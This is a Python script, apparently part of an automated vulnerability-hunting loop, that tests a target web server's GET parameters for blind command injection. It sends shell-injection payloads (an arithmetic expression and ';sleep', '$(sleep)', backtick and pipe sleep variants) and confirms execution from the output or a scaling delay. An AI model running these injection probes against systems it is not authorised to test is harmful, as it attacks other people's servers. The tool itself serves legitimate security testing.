#!/usr/bin/env python3
"""Generic blind command-injection probe for an UNKNOWN query sink.

Rule #65: the one loop hunts targets it has never seen — this probe
takes the sink spec from its marker argv (the loop encodes it there so
_probe_cmd needs no changes):

    MARKER = PLOOP65|<target_base>|<path>|GET|<p1,p2>

A command-injection claim needs the TARGET's server to pass a query
param through a SHELL (or equivalent) and execute attacker-controlled
syntax. The probe proves this per param through TWO independent
confirm channels — either one CONFIRMs:

  1. OUTPUT channel (via=cmdi-arith): GET path?<p>=$(expr 12345 + 6789).
     The probe NEVER transmits the string "19134". If the response
     body contains "19134", the target's shell evaluated the
     expression: command execution, not reflection. A verbatim echo
     of the payload ("12345 + 6789" visible, "19134" absent) is
     reflection -> FAILED (an explicit negative control).
  2. TIMING channel (via=cmdi-timing): a blind differential. Three
     benign GETs give the baseline median t0 (a jittery baseline —
     spread > 1.5s — or a slow baseline > 2.5s fails closed: no
     claim is ever grounded on noise). Then delay payloads
     (;sleep D / $(sleep D) / `sleep D` / |sleep D) in variant order,
     2 trials at D=4: a variant "catches" when BOTH trials run
     >= t0 + 4 - 1.5s. Then 2 trials at D=8 with the same variant:
     CONFIRM only when median(RTT8) - median(RTT4) >= 2.0s — the
     delay SCALES with the injected number. Random slowness does
     not scale, so a one-shot delay with no proportional follow-up
     is FAILED (fail-closed).

Fail-closed rules (the probe lesson, 29 Oct):
  - The control requests can never confirm (benign value, no canary,
    no expression, no delay).
  - Jittery or slow baseline -> VERDICT: FAILED (no timing claim).
  - A delay at D=4 that does not scale at D=8 -> FAILED.
  - A reflected payload without the computed result -> FAILED
    (reflection, not execution).
  - No output result and no scaled delay -> VERDICT: FAILED.

One self-contained reproducible command, fixed marker from argv, own
VERDICT line. Any exception -> PROBE_ERROR + VERDICT: FAILED. The
probe never fetches anything external; the only thing that "sleeps"
is the target's own shell, which is the signal under test.
"""
import http.client
import sys
import time
import urllib.parse

REQ_TIMEOUT = 25
_BASELINE_TIMEOUT = 10
_BENIGN = "ploop65-benign"
_ARITH_PAYLOAD = "$(expr 12345 + 6789)"
_ARITH_RESULT = "19134"
_ARITH_OPERAND = "12345"
# Delay ladder: the differential is D=4 vs D=8; both must scale.
_D1, _D2 = 4, 8
# Separator variants tried in order, first catch wins.
_VARIANTS = [";sleep %d", "$(sleep %d)", "`sleep %d`", "|sleep %d"]


def _timed_get(tb, path, params, timeout):
    """GET without following redirects. Returns (code, body, rtt)."""
    pu = urllib.parse.urlparse(tb.rstrip("/") + path)
    host, port = pu.hostname, pu.port
    use_ssl = pu.scheme == "https"
    q = urllib.parse.urlencode(params)
    target = pu.path + ("?" + q if q else "")
    conn_cls = (http.client.HTTPSConnection if use_ssl
                else http.client.HTTPConnection)
    conn = conn_cls(host, port or (443 if use_ssl else 80),
                    timeout=timeout)
    try:
        t0 = time.monotonic()
        conn.request("GET", target,
                     headers={"User-Agent": "PLOOP65",
                              "Host": pu.netloc})
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", "replace")
        return resp.status, body, time.monotonic() - t0
    finally:
        conn.close()


def _median(xs):
    s = sorted(xs)
    n = len(s)
    return s[n // 2] if n % 2 else (s[n // 2 - 1] + s[n // 2]) / 2.0


def main():
    # argv[1] is the marker: the _probe_cmd wrapper invokes
    #   python3 "$DST" "$MK"   (DST=argv[0], marker=argv[1])
    marker = sys.argv[1] if len(sys.argv) > 1 else "PLOOP65"
    try:
        _, tb_q, path_q, method, params_csv = marker.split("|", 4)
    except ValueError:
        print("PROBE_ERROR bad marker spec: %r" % marker)
        print("VERDICT: FAILED")
        return
    tb = urllib.parse.unquote(tb_q)
    path = urllib.parse.unquote(path_q)
    params = [p for p in params_csv.split(",") if p]
    method = (method or "GET").upper()
    if not tb or not path.startswith("/") or not params or \
            method != "GET":
        print("PROBE_ERROR invalid sink spec "
              "(command injection needs a GET query sink)")
        print("VERDICT: FAILED")
        return

    for p in params:
        # ---- Channel 1: command OUTPUT (arithmetic). ----
        # The canary VALUE "19134" is never transmitted — only the
        # expression. Its presence in the body proves evaluation.
        try:
            _, body, _ = _timed_get(tb, path, {p: _ARITH_PAYLOAD},
                                    _BASELINE_TIMEOUT)
        except Exception as e:
            print("PROBE_ERROR arith fetch failed for param %s: %s"
                  % (p, e))
            print("VERDICT: FAILED")
            return
        if _ARITH_RESULT in body:
            print("EVIDENCE sink=%s param=%s via=cmdi-arith "
                  "result=%s" % (path, p, _ARITH_RESULT))
            print("EVIDENCE class=command_injection via=cmdi-arith")
            print("VERDICT: CONFIRMED")
            return
        if _ARITH_OPERAND in body:
            print("PROBE_NOTE param %s: payload echoed verbatim but "
                  "the expression was not evaluated (reflection, not "
                  "execution)" % p)
        else:
            print("PROBE_NOTE param %s: no command-output signal" % p)

        # ---- Channel 2: BLIND TIMING differential. ----
        base = []
        try:
            for _ in range(3):
                _, _, rtt = _timed_get(tb, path, {p: _BENIGN},
                                       _BASELINE_TIMEOUT)
                base.append(rtt)
        except Exception as e:
            print("PROBE_ERROR baseline fetch failed for param %s: %s"
                  % (p, e))
            print("VERDICT: FAILED")
            return
        t0 = _median(base)
        spread = max(base) - min(base)
        if spread > 1.5 or t0 > 2.5:
            # Fail closed: a timing claim needs a fast, stable
            # baseline. Jitter or slowness can never confirm.
            print("PROBE_NOTE param %s: baseline unstable "
                  "(median=%.2fs spread=%.2fs) — timing channel "
                  "abandoned (fail-closed)" % (p, t0, spread))
            continue
        caught_variant = None
        rtts_d1 = []
        for variant in _VARIANTS:
            trials = []
            try:
                for _ in range(2):
                    _, _, rtt = _timed_get(
                        tb, path, {p: variant % _D1}, REQ_TIMEOUT)
                    trials.append(rtt)
            except Exception as e:
                print("PROBE_ERROR delay fetch failed for param %s: "
                      "%s" % (p, e))
                print("VERDICT: FAILED")
                return
            if all(t >= t0 + _D1 - 1.5 for t in trials):
                caught_variant, rtts_d1 = variant, trials
                break
            print("PROBE_NOTE param %s: variant %r no delay "
                  "(rtts=%s)" % (p, variant % _D1,
                                 ",".join("%.2f" % t
                                           for t in trials)))
        if caught_variant is None:
            print("PROBE_NOTE param %s: no delay variant caught "
                  "(no timing signal)" % p)
            continue
        # Differential: the SAME variant at D2 must run proportionally
        # longer. Random slowness does not scale with the number.
        rtts_d2 = []
        try:
            for _ in range(2):
                _, _, rtt = _timed_get(
                    tb, path, {p: caught_variant % _D2}, REQ_TIMEOUT)
                rtts_d2.append(rtt)
        except Exception as e:
            print("PROBE_ERROR delay fetch failed for param %s: %s"
                  % (p, e))
            print("VERDICT: FAILED")
            return
        scale = _median(rtts_d2) - _median(rtts_d1)
        if scale >= 2.0:
            print("EVIDENCE sink=%s param=%s via=cmdi-timing "
                  "baseline=%.2f d%d=%.2f d%d=%.2f scale=%.2f" %
                  (path, p, t0, _D1, _median(rtts_d1),
                   _D2, _median(rtts_d2), scale))
            print("EVIDENCE class=command_injection via=cmdi-timing")
            print("VERDICT: CONFIRMED")
            return
        print("PROBE_NOTE param %s: delay at D=%d did not scale at "
              "D=%d (scale=%.2fs) — one-shot slowness, not execution "
              "(fail-closed)" % (p, _D1, _D2, scale))

    print("VERDICT: FAILED")


if __name__ == "__main__":
    main()
